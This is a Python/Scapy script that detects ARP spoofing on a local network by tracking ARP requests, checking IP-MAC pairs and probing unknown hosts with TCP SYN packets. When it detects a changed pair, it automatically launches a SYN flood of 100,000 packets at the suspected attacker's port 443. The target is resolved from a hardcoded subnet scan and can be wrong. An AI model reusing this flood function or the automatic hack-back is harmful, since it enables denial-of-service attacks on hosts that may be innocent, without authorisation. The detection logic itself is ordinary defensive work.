from scapy.all import *
from scapy.all import ARP,Ether,srp
from scapy.layers.inet import IP, TCP,ICMP
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort
import threading
import datetime

IP_MAC_PAIRS = {}
ARP_REQ_TABLE = {}
q1=0
q2=0

def sniff_requests():
   
    sniff(filter='arp', lfilter=outgoing_req, prn=add_req, iface=conf.iface)

def sniff_replays():
   
    sniff(filter='arp', lfilter=incoming_reply, prn=check_arp_header, iface=conf.iface)

def print_arp(Pckt):
    
    if Pckt[ARP].op == 1:
        print(Pckt[ARP].hwsrc, ' who has ', Pckt[ARP].pdst)
    else:
        print(Pckt[ARP].psrc, ' is at ', Pckt[ARP].hwsrc)

def incoming_reply(Pckt):
   
    return Pckt[ARP].psrc != str(get_if_addr(conf.iface)) and Pckt[ARP].op == 2

def outgoing_req(Pckt):
    
    return Pckt[ARP].psrc == str(get_if_addr(conf.iface)) and Pckt[ARP].op == 1

def add_req(Pckt):

    ARP_REQ_TABLE[Pckt[ARP].pdst] = datetime.datetime.now()

def check_arp_header(Pckt):
   
    if not Pckt[Ether].src == Pckt[ARP].hwsrc or not Pckt[Ether].dst == Pckt[ARP].hwdst:
        return alarm('inconsistent ARP message')
    return known_traffic(Pckt)

def known_traffic(Pckt):
   
    if Pckt[ARP].psrc not in IP_MAC_PAIRS.keys():
        return spoof_detection(Pckt)

    elif IP_MAC_PAIRS[Pckt[ARP].psrc] != Pckt[ARP].hwsrc:
        mac = Pckt[0][ARP].hwsrc
        ip=getIP(mac)
        print("Attacker MAC : ",mac)  
        print("Attacker IP : ",ip)
        INITIATE_SYN_FLOOD(ip, 443, number_of_packets_to_send=100000)
        return alarm('IP-MAC pair change detected')
        
    elif IP_MAC_PAIRS[Pckt[ARP].psrc] == Pckt[ARP].hwsrc:
        return

def spoof_detection(Pckt):
    
    ip_ = Pckt[ARP].psrc    
    t = datetime.datetime.now()
    mac = Pckt[0][ARP].hwsrc
     
    if ip_ in ARP_REQ_TABLE.keys() and (t - ARP_REQ_TABLE[ip_]).total_seconds() <= 5:
        ip = IP(dst=ip_)        
        SYN = TCP(sport=40508, dport=40508, flags="S", seq=12345)
        E = Ether(dst=mac)
         
        
        if not srp1(E / ip / SYN, verbose=False, timeout=2):
            
            alarm('No TCP ACK, fake IP-MAC pair')
       
        else:
            
            IP_MAC_PAIRS[ip_] = Pckt[ARP].hwsrc
    
    else:
        ip = IP(dst=ip_)    
        send(ARP(op=1, pdst=ip_), verbose=False)

def getIP(target_mac):

    arp=ARP(op=1,pdst='192.168.205.0/24',hwdst='ff:ff:ff:ff:ff:ff',psrc='192.168.205.1')
    ether=Ether(dst='ff:ff:ff:ff:ff:ff')
    packet=ether/arp
    result=srp(packet,timeout=3,verbose=0)[0]
    for sent,received in result:
        
        ip=received.psrc
        mac=received.hwsrc
        if mac==target_mac and received.psrc != '192.168.205.139' :
            return ip

def alarm(alarm_type):
 
    print('Under Attack ', alarm_type)

def INITIATE_SYN_FLOOD(target_ip_address: str, target_port: int, number_of_packets_to_send: int = 10000, size_of_packet: int = 50):
    print('\n [+] INITIATING SYN FLOOD [+]\n')
    ip = IP(dst=target_ip_address)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * size_of_packet)
    p = ip / tcp / raw
    send(p, count=number_of_packets_to_send, verbose=0)
    print('INITIATE_SYN_FLOOD(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(size_of_packet) + ' size to ' + target_ip_address + ' on port ' + str(target_port))

if __name__ == "__main__":
    req_ = threading.Thread(target=sniff_requests, args=())
    req_.start()
    rep_ = threading.Thread(target=sniff_replays, args=())
    rep_.start()